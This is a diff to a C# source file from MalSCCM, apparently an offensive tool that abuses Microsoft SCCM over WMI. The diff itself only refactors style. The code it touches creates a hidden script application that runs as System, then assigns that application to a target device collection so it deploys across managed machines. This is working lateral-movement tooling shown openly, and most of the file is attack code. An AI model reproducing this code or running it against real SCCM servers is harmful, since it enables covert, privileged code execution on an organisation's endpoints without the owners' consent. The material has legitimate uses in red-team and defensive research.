@@ -1,21 +1,22 @@
 ﻿using System;
 using System.Management;
 using System.Text;
+
 using MalSCCM.Commands;
 
-public class Application
+public static class Application
 {
     public static bool FbCreateSCCMApplication()
     {
         try
         {
-            ManagementClass IDClass = new ManagementClass($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}:SMS_Identification");
-            ManagementClass AppClass = new ManagementClass($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}:SMS_Application");
+            var IDClass = new ManagementClass($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}:SMS_Identification");
+            var AppClass = new ManagementClass($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}:SMS_Application");
 
             object[] methodArgs = {null};
 
-            object result = IDClass.InvokeMethod("GetSiteID", methodArgs);
-            string scopeid = (string)methodArgs[0];
+            var result = IDClass.InvokeMethod("GetSiteID", methodArgs);
+            var scopeid = (string)methodArgs[0];
             var trimscopeid = "ScopeId_" + scopeid.Trim(new char[] { '{', '}' });
 
             Console.WriteLine("ScopeID: " + trimscopeid);
@@ -27,7 +28,7 @@ public class Application
             var NewFileID = "File_" + Guid.NewGuid();
             Console.WriteLine("NewFileID: " + NewFileID);
 
-            StringBuilder xml = new StringBuilder();
+            var xml = new StringBuilder();
 
             xml.AppendLine(@"<?xml version=""1.0"" encoding=""utf-16""?><AppMgmtDigest xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""><Application AuthoringScopeId=""" + trimscopeid + @""" LogicalName=""" + NewAppID + @""" Version=""2""><DisplayInfo DefaultLanguage=""en-US""><Info Language=""en-US""><Title>" + App.AppName + @"</Title><Publisher/><Version/></Info></DisplayInfo><DeploymentTypes><DeploymentType AuthoringScopeId=""" + trimscopeid + @""" LogicalName=""" + NewDeployID + @""" Version=""2""/></DeploymentTypes><Title ResourceId=""Res_684364143"">" + App.AppName + @"</Title><Description ResourceId=""Res_1018411239""/><Publisher ResourceId=""Res_1340020890""/><SoftwareVersion ResourceId=""Res_597041892""/><CustomId ResourceId=""Res_872061892""/></Application><DeploymentType AuthoringScopeId=""" + trimscopeid + @""" LogicalName=""" + NewDeployID + @""" Version=""2""><Title ResourceId=""Res_1244298486"">" + App.AppName + @"</Title><Description ResourceId=""Res_405397997""/><DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology><Technology>Script</Technology><Hosting>Native</Hosting><Installer Technology=""Script""><ExecutionContext>System</ExecutionContext><DetectAction><Provider>Local</Provider><Args><Arg Name=""ExecutionContext"" Type=""String"">System</Arg><Arg Name=""MethodBody"" Type=""String"">&lt;?xml version=""1.0"" encoding=""utf-16""?&gt;");
             xml.AppendLine(@"&lt;EnhancedDetectionMethod xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest""&gt;");
@@ -58,7 +59,7 @@ public class Application
 
             Console.WriteLine("Creating Instance");
 
-            ManagementObject newInstance = AppClass.CreateInstance();
+            var newInstance = AppClass.CreateInstance();
             
             newInstance["SDMPackageXML"] = xml.ToString();
             newInstance["IsHidden"] = true;
@@ -85,7 +86,7 @@ public class Application
             var mgmtScope = new ManagementScope($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}");
             mgmtScope.Connect();
             var mgmtSrchr = new ManagementObjectSearcher(mgmtScope, Query);
-            ManagementObjectCollection objColl = mgmtSrchr.Get();
+            var objColl = mgmtSrchr.Get();
 
             foreach (ManagementObject obj in objColl)
             {
@@ -111,7 +112,7 @@ public class Application
     {
         try
         {
-            ManagementClass AppAssignementClass = new ManagementClass($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}:SMS_ApplicationAssignment");
+            var AppAssignementClass = new ManagementClass($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}:SMS_ApplicationAssignment");
             var TargetCollectionID = Group.TargetCollectionID;
 
             var Query = new SelectQuery($"Select * FROM SMS_Application WHERE LocalizedDisplayName = '{App.AppName}'");
@@ -119,7 +120,7 @@ public class Application
             mgmtScope.Connect();
             var mgmtSrchr = new ManagementObjectSearcher(mgmtScope, Query);
             var CI_ID = "";
-            int CI_IDint = 0;
+            var CI_IDint = 0;
             var CI_UniqueID = "";
 
             foreach (var result in mgmtSrchr.Get())
@@ -131,7 +132,7 @@ public class Application
 
             var Date = DateTime.Now.ToString("yyyyMMddHHmmss") + ".000000+***";
 
-            ManagementObject newInstance = AppAssignementClass.CreateInstance();
+            var newInstance = AppAssignementClass.CreateInstance();
 
             newInstance["ApplicationName"] = App.AppName;
             newInstance["AssignmentName"] = App.AssignmentName;
@@ -180,7 +181,7 @@ public class Application
             var mgmtScope = new ManagementScope($"\\\\{Inspect.ServerName}\\root\\sms\\site_{Inspect.SiteCode}");
             mgmtScope.Connect();
             var mgmtSrchr = new ManagementObjectSearcher(mgmtScope, Query);
-            ManagementObjectCollection objColl = mgmtSrchr.Get();
+            var objColl = mgmtSrchr.Get();
 
             foreach (ManagementObject obj in objColl)
             {
@@ -200,5 +201,4 @@ public class Application
             return false;
         }
     }
-
 }
